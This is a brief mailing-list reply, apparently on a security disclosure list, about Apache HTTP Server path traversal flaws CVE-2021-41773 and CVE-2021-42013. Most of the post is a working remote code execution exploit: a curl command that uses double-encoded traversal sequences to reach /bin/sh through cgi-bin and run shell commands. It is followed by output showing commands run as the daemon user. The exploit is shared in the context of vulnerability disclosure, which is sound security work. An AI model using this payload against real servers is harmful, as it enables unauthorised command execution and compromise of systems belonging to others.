Subject: Re: CVE-2021-42013: Path Traversal and Remote Code
 Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of
 CVE-2021-41773)

Hi,

I posted RCE exploit for this (it works for both CVEs: 41773 & 42013)
and some other details regarding requirements / exploitability, which
you may find useful at:

Excerpt (for the sake of ml-archive):

RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50
(CVE-2021-42013): root@...06:~# curl
'http://192.168.0.191/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
--data 'echo Content-Type: text/plain; echo; id' uid=1(daemon)
gid=1(daemon) groups=1(daemon)


Cheers.
